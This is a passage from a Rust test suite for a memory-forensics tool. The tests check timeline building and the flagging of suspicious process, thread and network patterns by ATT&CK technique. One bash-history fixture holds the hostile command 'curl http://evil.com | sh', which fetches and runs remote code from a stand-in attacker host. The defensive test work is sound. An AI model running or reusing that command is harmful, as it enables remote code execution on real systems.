        }];
        print_timeline(&events, OutputFormat::Json);
    }

    #[test]
    fn print_timeline_csv_does_not_panic() {
        let events = vec![TimelineEvent {
            timestamp_secs: 1_712_000_000,
            timestamp: "2024-04-02 04:26:40 UTC".into(),
            event_type: "connection_create".into(),
            pid: 4,
            description: "TCP 10.0.0.1:445 -> 10.0.0.2:49152".into(),
            tags: vec![],
        }];
        print_timeline(&events, OutputFormat::Csv);
    }

    // -----------------------------------------------------------------------
    // Thread events
    // -----------------------------------------------------------------------

    #[test]
    fn build_windows_thread_events_creates_thread_create_entries() {
        use memf_windows::WinThreadInfo;
        let threads = vec![
            WinThreadInfo {
                tid: 100,
                pid: 4,
                create_time: 133_574_400_000_000_000, // 2024-04-02 ~00:00 UTC
                start_address: 0x7FF6_1234_0000,
                teb_addr: 0,
                state: memf_windows::ThreadState::Waiting,
                vaddr: 0,
            },
            WinThreadInfo {
                tid: 200,
                pid: 4,
                create_time: 0, // no timestamp — should be skipped
                start_address: 0x7FF6_5678_0000,
                teb_addr: 0,
                state: memf_windows::ThreadState::Waiting,
                vaddr: 0,
            },
        ];
        let events = build_windows_thread_events(&threads);
        // Only one thread has a valid create_time
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].event_type, "thread_create");
        assert_eq!(events[0].pid, 4);
        assert!(events[0].description.contains("TID 100"));
    }

    // -----------------------------------------------------------------------
    // Bash history events
    // -----------------------------------------------------------------------

    #[test]
    fn build_linux_bash_events_creates_bash_command_entries() {
        use memf_linux::BashHistoryInfo;
        let entries = vec![
            BashHistoryInfo {
                pid: 1000,
                comm: "bash".into(),
                command: "whoami".into(),
                timestamp: Some(1_712_000_000),
                index: 1,
            },
            BashHistoryInfo {
                pid: 1000,
                comm: "bash".into(),
                command: "ls -la".into(),
                timestamp: None, // no timestamp — should be skipped
                index: 2,
            },
            BashHistoryInfo {
                pid: 1001,
                comm: "bash".into(),
                command: "curl http://evil.com | sh".into(),
                timestamp: Some(1_712_003_600),
                index: 1,
            },
        ];
        let events = build_linux_bash_events(&entries);
        assert_eq!(events.len(), 2);
        assert!(events.iter().all(|e| e.event_type == "bash_command"));
        // Sorted by timestamp
        assert!(events[0].timestamp_secs <= events[1].timestamp_secs);
        assert!(events[1].description.contains("curl"));
    }

    #[test]
    fn build_linux_bash_events_empty_when_no_timestamps() {
        use memf_linux::BashHistoryInfo;
        let entries = vec![BashHistoryInfo {
            pid: 1000,
            comm: "bash".into(),
            command: "echo hello".into(),
            timestamp: None,
            index: 1,
        }];
        let events = build_linux_bash_events(&entries);
        assert!(events.is_empty());
    }

    // -----------------------------------------------------------------------
    // DLL load events
    // -----------------------------------------------------------------------

    #[test]
    fn build_windows_dll_events_creates_dll_load_entries() {
        use memf_windows::{WinDllInfo, WinProcessInfo};
        let procs = vec![WinProcessInfo {
            pid: 1234,
            ppid: 4,
            image_name: "cmd.exe".into(),
            create_time: 133_574_400_000_000_000,
            exit_time: 0,
            cr3: 0x1000,
            peb_addr: 0,
            vaddr: 0,
            thread_count: 1,
            is_wow64: false,
        }];
        let proc_dlls: Vec<(u64, Vec<WinDllInfo>)> = vec![(
            1234,
            vec![
                WinDllInfo {
                    name: "ntdll.dll".into(),
                    full_path: "C:\\Windows\\System32\\ntdll.dll".into(),
                    base_addr: 0x7FFE_0000_0000,
                    size: 0x1F_0000,
                    load_order: 0,
                },
                WinDllInfo {
                    name: "kernel32.dll".into(),
                    full_path: "C:\\Windows\\System32\\kernel32.dll".into(),
                    base_addr: 0x7FFE_1000_0000,
                    size: 0x10_0000,
                    load_order: 1,
                },
            ],
        )];
        let events = build_windows_dll_events(&procs, &proc_dlls);
        // DLL events inherit process create_time (no per-DLL timestamp)
        assert_eq!(events.len(), 2);
        assert!(events.iter().all(|e| e.event_type == "dll_load"));
        assert!(events[0].description.contains("ntdll.dll"));
        assert_eq!(events[0].pid, 1234);
    }

    // -----------------------------------------------------------------------
    // Suspicious pattern detection (Windows)
    // -----------------------------------------------------------------------

    #[test]
    fn tag_suspicious_windows_flags_singleton_duplication() {
        use memf_windows::WinProcessInfo;
        // Two lsass.exe processes — always suspicious
        let procs = vec![
            WinProcessInfo {
                pid: 600,
                ppid: 500,
                image_name: "lsass.exe".into(),
                create_time: 133_574_400_000_000_000,
                exit_time: 0,
                cr3: 0x1000,
                peb_addr: 0,
                vaddr: 0,
                thread_count: 10,
                is_wow64: false,
            },
            WinProcessInfo {
                pid: 7777,
                ppid: 500,
                image_name: "lsass.exe".into(),
                create_time: 133_574_410_000_000_000,
                exit_time: 0,
                cr3: 0x2000,
                peb_addr: 0,
                vaddr: 0,
                thread_count: 1,
                is_wow64: false,
            },
        ];
        let mut events = build_windows_timeline(&procs, &[]);
        tag_suspicious_windows(&mut events, &procs, &[], &[], &[]);
        let tagged: Vec<_> = events.iter().filter(|e| !e.tags.is_empty()).collect();
        assert!(!tagged.is_empty());
        assert!(tagged.iter().any(|e| e
            .tags
            .contains(&"singleton-duplicate:T1036.005".to_string())));
    }

    #[test]
    fn tag_suspicious_windows_flags_parent_child_violation() {
        use memf_windows::WinProcessInfo;
        // svchost.exe with ppid that is NOT services.exe (PID 500)
        let procs = vec![
            WinProcessInfo {
                pid: 500,
                ppid: 400,
                image_name: "services.exe".into(),
                create_time: 133_574_400_000_000_000,
                exit_time: 0,
                cr3: 0x1000,
                peb_addr: 0,
                vaddr: 0,
                thread_count: 5,
                is_wow64: false,
            },
            WinProcessInfo {
                pid: 800,
                ppid: 9999, // wrong parent — should be 500 (services.exe)
                image_name: "svchost.exe".into(),
                create_time: 133_574_405_000_000_000,
                exit_time: 0,
                cr3: 0x2000,
                peb_addr: 0,
                vaddr: 0,
                thread_count: 3,
                is_wow64: false,
            },
        ];
        let mut events = build_windows_timeline(&procs, &[]);
        tag_suspicious_windows(&mut events, &procs, &[], &[], &[]);
        let tagged: Vec<_> = events
            .iter()
            .filter(|e| {
                e.tags
                    .contains(&"parent-child-violation:T1036.005".to_string())
            })
            .collect();
        assert!(!tagged.is_empty());
    }

    #[test]
    fn tag_suspicious_windows_flags_non_networking_process() {
        use memf_windows::{WinConnectionInfo, WinProcessInfo};
        // notepad.exe with a TCP connection — always suspicious
        let procs = vec![WinProcessInfo {
            pid: 3000,
            ppid: 1000,
            image_name: "notepad.exe".into(),
            create_time: 133_574_400_000_000_000,
            exit_time: 0,
            cr3: 0x1000,
            peb_addr: 0,
            vaddr: 0,
            thread_count: 1,
            is_wow64: false,
        }];
        let conns = vec![WinConnectionInfo {
            pid: 3000,
            local_addr: "10.0.0.5".into(),
            local_port: 49152,
            remote_addr: "1.2.3.4".into(),
            remote_port: 443,
            state: memf_windows::WinTcpState::Established,
            protocol: "TCP".into(),
            process_name: "notepad.exe".into(),
            create_time: 133_574_401_000_000_000,
        }];
        let mut events = build_windows_timeline(&procs, &conns);
        tag_suspicious_windows(&mut events, &procs, &conns, &[], &[]);
        let tagged: Vec<_> = events
            .iter()
            .filter(|e| e.tags.contains(&"non-networking-process:T1071".to_string()))
            .collect();
        assert!(!tagged.is_empty());
    }

    #[test]
    fn tag_suspicious_windows_flags_thread_outside_module() {
        use memf_windows::{WinDllInfo, WinProcessInfo, WinThreadInfo};
        let procs = vec![WinProcessInfo {
            pid: 1234,
            ppid: 4,
            image_name: "explorer.exe".into(),
            create_time: 133_574_400_000_000_000,
            exit_time: 0,
            cr3: 0x1000,
            peb_addr: 0,
            vaddr: 0,
            thread_count: 5,
            is_wow64: false,
        }];
        let threads = vec![WinThreadInfo {
            tid: 5678,
            pid: 1234,
            create_time: 133_574_401_000_000_000,
            start_address: 0xDEAD_0000, // not in any DLL range
            teb_addr: 0,
            state: memf_windows::ThreadState::Waiting,
            vaddr: 0,
        }];
        let proc_dlls: Vec<(u64, Vec<WinDllInfo>)> = vec![(
            1234,
            vec![WinDllInfo {
                name: "ntdll.dll".into(),
                full_path: "C:\\Windows\\System32\\ntdll.dll".into(),
                base_addr: 0x7FFE_0000_0000,
                size: 0x1F_0000,
                load_order: 0,
            }],
        )];
        let mut events = build_windows_timeline(&procs, &[]);
        let mut thread_events = build_windows_thread_events(&threads);
        events.append(&mut thread_events);
        tag_suspicious_windows(&mut events, &procs, &[], &threads, &proc_dlls);
        let tagged: Vec<_> = events
            .iter()
            .filter(|e| e.tags.contains(&"thread-outside-module:T1055".to_string()))
            .collect();
        assert!(!tagged.is_empty());
    }

    #[test]
    fn tag_suspicious_windows_no_false_positives_on_clean_system() {
        use memf_windows::WinProcessInfo;
        // Normal Windows boot hierarchy — correct parent-child relationships
        let procs = vec![
            WinProcessInfo {
                pid: 4,
                ppid: 0,
                image_name: "System".into(),
                create_time: 133_574_400_000_000_000,
                exit_time: 0,
                cr3: 0x1000,
                peb_addr: 0,
                vaddr: 0,
                thread_count: 100,
                is_wow64: false,
            },
            WinProcessInfo {
                pid: 400,
                ppid: 4,
                image_name: "smss.exe".into(),
                create_time: 133_574_400_200_000_000,
                exit_time: 0,
                cr3: 0x1200,
                peb_addr: 0,
                vaddr: 0,
                thread_count: 2,
                is_wow64: false,
            },
            WinProcessInfo {
                pid: 500,
                ppid: 400,
                image_name: "wininit.exe".into(),
                create_time: 133_574_400_500_000_000,
                exit_time: 0,
                cr3: 0x1500,
                peb_addr: 0,
                vaddr: 0,
                thread_count: 3,
                is_wow64: false,
            },
            WinProcessInfo {
                pid: 600,
                ppid: 500,
                image_name: "lsass.exe".into(),
                create_time: 133_574_401_000_000_000,
                exit_time: 0,
                cr3: 0x2000,
                peb_addr: 0,
                vaddr: 0,
                thread_count: 10,
                is_wow64: false,
            },
        ];
        let mut events = build_windows_timeline(&procs, &[]);
        tag_suspicious_windows(&mut events, &procs, &[], &[], &[]);
        // No tags on clean system
        assert!(events.iter().all(|e| e.tags.is_empty()));
    }

    // -----------------------------------------------------------------------
    // Bodyfile output
    // -----------------------------------------------------------------------

    #[test]
    fn print_timeline_bodyfile_does_not_panic() {
        let events = vec![TimelineEvent {
            timestamp_secs: 1_712_000_000,
            timestamp: "2024-04-02 04:26:40 UTC".into(),
            event_type: "process_create".into(),
            pid: 4,
            description: "System (PID 4)".into(),
            tags: vec![],
        }];
        print_timeline_bodyfile(&events);
    }

    #[test]
    fn print_timeline_bodyfile_format_matches_mactime() {
        // bodyfile format: MD5|name|inode|mode|UID|GID|size|atime|mtime|ctime|crtime
        let events = vec![TimelineEvent {
            timestamp_secs: 1_712_000_000,
            timestamp: "2024-04-02 04:26:40 UTC".into(),
            event_type: "process_create".into(),
            pid: 1234,
            description: "cmd.exe (PID 1234)".into(),
            tags: vec!["singleton-duplicate:T1036.005".into()],
        }];
        // Capture stdout - we just verify it doesn't panic and produces output.
        // The bodyfile format correctness will be verified in GREEN phase.
        print_timeline_bodyfile(&events);
    }

    // -----------------------------------------------------------------------
    // Tags display in table output
    // -----------------------------------------------------------------------

    #[test]
    fn print_timeline_table_shows_tags() {
        let events = vec![TimelineEvent {
            timestamp_secs: 1_712_000_000,
            timestamp: "2024-04-02 04:26:40 UTC".into(),
            event_type: "process_create".into(),
            pid: 600,
            description: "lsass.exe (PID 600)".into(),
            tags: vec!["singleton-duplicate:T1036.005".into()],
        }];
        // Should not panic; visual verification of tag display
        print_timeline(&events, OutputFormat::Table);
    }

    #[test]
    fn print_timeline_json_includes_tags_array() {
        let events = vec![TimelineEvent {
            timestamp_secs: 1_712_000_000,
            timestamp: "2024-04-02 04:26:40 UTC".into(),
            event_type: "process_create".into(),
            pid: 600,
            description: "lsass.exe (PID 600)".into(),
            tags: vec![
                "singleton-duplicate:T1036.005".into(),
                "parent-child-violation:T1036.005".into(),
            ],
        }];
        print_timeline(&events, OutputFormat::Json);
    }

    // -----------------------------------------------------------------------
    // Pivot point: process with both listener and outbound (notable)
    // -----------------------------------------------------------------------

    #[test]
    fn tag_suspicious_windows_flags_pivot_point() {
        use memf_windows::{WinConnectionInfo, WinProcessInfo};
        // Process with both a LISTENING and ESTABLISHED connection
        let procs = vec![WinProcessInfo {
            pid: 2000,
            ppid: 500,
            image_name: "suspicious.exe".into(),
            create_time: 133_574_400_000_000_000,
            exit_time: 0,
            cr3: 0x1000,
            peb_addr: 0,
            vaddr: 0,
            thread_count: 3,
            is_wow64: false,
        }];
        let conns = vec![
            WinConnectionInfo {
                pid: 2000,
                local_addr: "0.0.0.0".into(),
                local_port: 4444,
                remote_addr: "0.0.0.0".into(),
                remote_port: 0,
                state: memf_windows::WinTcpState::Listen,
                protocol: "TCP".into(),
                process_name: "suspicious.exe".into(),
                create_time: 133_574_401_000_000_000,
            },
            WinConnectionInfo {
                pid: 2000,
                local_addr: "10.0.0.5".into(),
                local_port: 49152,
                remote_addr: "1.2.3.4".into(),
                remote_port: 443,
                state: memf_windows::WinTcpState::Established,
                protocol: "TCP".into(),
                process_name: "suspicious.exe".into(),
                create_time: 133_574_402_000_000_000,
            },
        ];
        let mut events = build_windows_timeline(&procs, &conns);
        tag_suspicious_windows(&mut events, &procs, &conns, &[], &[]);
        let tagged: Vec<_> = events
            .iter()
            .filter(|e| e.tags.contains(&"pivot-point:T1090".to_string()))
            .collect();
        assert!(!tagged.is_empty());
    }

    // -----------------------------------------------------------------------
    // Full Windows pipeline: all event sources merged + tagged + sorted
    // -----------------------------------------------------------------------

    #[test]
    fn full_windows_pipeline_merges_all_event_types() {
        use memf_windows::{WinConnectionInfo, WinDllInfo, WinProcessInfo, WinThreadInfo};

        let procs = vec![WinProcessInfo {
            pid: 4,
            ppid: 0,
            image_name: "System".into(),
            create_time: 133_574_400_000_000_000, // 2024-04-02 00:00:00 UTC
            exit_time: 0,
            cr3: 0x1000,
            peb_addr: 0,
            vaddr: 0xFFFF_F000,
            thread_count: 50,
            is_wow64: false,
        }];
        let conns = vec![WinConnectionInfo {
            pid: 4,
            local_addr: "0.0.0.0".into(),
            local_port: 445,
            remote_addr: "10.0.0.5".into(),
            remote_port: 49152,
            state: memf_windows::WinTcpState::Established,
            protocol: "TCP".into(),
            process_name: "System".into(),
            create_time: 133_574_401_000_000_000,
        }];
        let threads = vec![WinThreadInfo {
            tid: 100,
            pid: 4,
            create_time: 133_574_400_500_000_000,
            start_address: 0xFFFFF800_01000000,
            teb_addr: 0,
            state: memf_windows::ThreadState::Running,
            vaddr: 0,
        }];
        let proc_dlls: Vec<(u64, Vec<WinDllInfo>)> = vec![(
            4,
            vec![WinDllInfo {
                name: "ntoskrnl.exe".into(),
                full_path: "\\SystemRoot\\system32\\ntoskrnl.exe".into(),
                base_addr: 0xFFFFF800_01000000,
                size: 0x100_0000,
                load_order: 0,
            }],
        )];

        // Build all event types
        let mut events = build_windows_timeline(&procs, &conns);
        events.extend(build_windows_thread_events(&threads));
        events.extend(build_windows_dll_events(&procs, &proc_dlls));
        events.sort_by_key(|e| e.timestamp_secs);
        tag_suspicious_windows(&mut events, &procs, &conns, &threads, &proc_dlls);

        // Verify we have all event types
        let types: std::collections::HashSet<&str> =
            events.iter().map(|e| e.event_type.as_str()).collect();
        assert!(types.contains("process_create"), "missing process_create");
        assert!(
            types.contains("connection_create"),
            "missing connection_create"
        );
        assert!(types.contains("thread_create"), "missing thread_create");
        assert!(types.contains("dll_load"), "missing dll_load");

        // Verify events are sorted by timestamp
        for w in events.windows(2) {
            assert!(w[0].timestamp_secs <= w[1].timestamp_secs);
        }
    }

    #[test]
    fn full_linux_pipeline_merges_bash_events() {
        let procs = vec![memf_linux::ProcessInfo {
            pid: 1000,
            ppid: 1,
            comm: "bash".into(),
            state: memf_linux::ProcessState::Sleeping,
            vaddr: 0,
            cr3: None,
            start_time: 50_000_000_000,
        }];
        let bash_entries = vec![memf_linux::BashHistoryInfo {
            pid: 1000,
            comm: "bash".into(),
            command: "whoami".into(),
            timestamp: Some(1_712_000_100),
            index: 0,
        }];

        let mut events = build_linux_timeline(&procs, Some(1_712_000_000));
        events.extend(build_linux_bash_events(&bash_entries));
        events.sort_by_key(|e| e.timestamp_secs);

        let types: std::collections::HashSet<&str> =
            events.iter().map(|e| e.event_type.as_str()).collect();
        assert!(types.contains("process_start"), "missing process_start");
        assert!(types.contains("bash_command"), "missing bash_command");

        // Verify sorted
        for w in events.windows(2) {
            assert!(w[0].timestamp_secs <= w[1].timestamp_secs);
        }
    }

    // --- Procdump / dump_process_memory tests ---

    #[test]
    fn dump_process_memory_writes_correct_bytes() {
        use memf_core::test_builders::{flags, PageTableBuilder};
        use memf_core::vas::{TranslationMode, VirtualAddressSpace};

        // Two virtual pages at known addresses with distinct fill bytes
        let vaddr_a: u64 = 0x0000_0000_0040_0000; // page 1
        let vaddr_b: u64 = 0x0000_0000_0040_1000; // page 2
        let paddr_a: u64 = 0x0050_0000;
        let paddr_b: u64 = 0x0050_1000;

        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(vaddr_a, paddr_a, flags::WRITABLE | flags::USER)
            .write_phys(paddr_a, &[0xAA; 4096])
            .map_4k(vaddr_b, paddr_b, flags::WRITABLE | flags::USER)
            .write_phys(paddr_b, &[0xBB; 4096])
            .build();

        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);

        let ranges = vec![(vaddr_a, vaddr_a + 0x1000), (vaddr_b, vaddr_b + 0x1000)];
        let mut output = Vec::new();
        let written = dump_process_memory(&vas, &ranges, &mut output).unwrap();

        assert_eq!(written, 8192, "should write 2 pages = 8192 bytes");
        assert_eq!(output.len(), 8192);
        assert!(
            output[..4096].iter().all(|&b| b == 0xAA),
            "first page should be 0xAA"
        );
        assert!(
            output[4096..].iter().all(|&b| b == 0xBB),
            "second page should be 0xBB"
        );
    }

    #[test]
    fn dump_process_memory_zeros_unmapped_pages() {
        use memf_core::test_builders::{flags, PageTableBuilder};
        use memf_core::vas::{TranslationMode, VirtualAddressSpace};

        // Map only the first page; the second page is unmapped
        let vaddr_mapped: u64 = 0x0000_0000_0060_0000;
        let vaddr_unmapped: u64 = 0x0000_0000_0060_1000;
        let paddr: u64 = 0x0070_0000;

        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(vaddr_mapped, paddr, flags::WRITABLE | flags::USER)
            .write_phys(paddr, &[0xCC; 4096])
            .build();

        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);

        // Range covers both the mapped and unmapped pages
        let ranges = vec![(vaddr_mapped, vaddr_unmapped + 0x1000)];
        let mut output = Vec::new();
        let written = dump_process_memory(&vas, &ranges, &mut output).unwrap();

        assert_eq!(written, 8192, "should write 2 pages = 8192 bytes");
        assert!(
            output[..4096].iter().all(|&b| b == 0xCC),
            "mapped page should be 0xCC"
        );
        assert!(
            output[4096..].iter().all(|&b| b == 0x00),
            "unmapped page should be zeroes"
        );
    }

    #[test]
    fn dump_process_memory_empty_ranges() {
        use memf_core::test_builders::PageTableBuilder;
        use memf_core::vas::{TranslationMode, VirtualAddressSpace};

        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);

        let ranges: Vec<(u64, u64)> = vec![];
        let mut output = Vec::new();
        let written = dump_process_memory(&vas, &ranges, &mut output).unwrap();

        assert_eq!(written, 0, "empty ranges should produce 0 bytes");
        assert!(output.is_empty());
    }
}
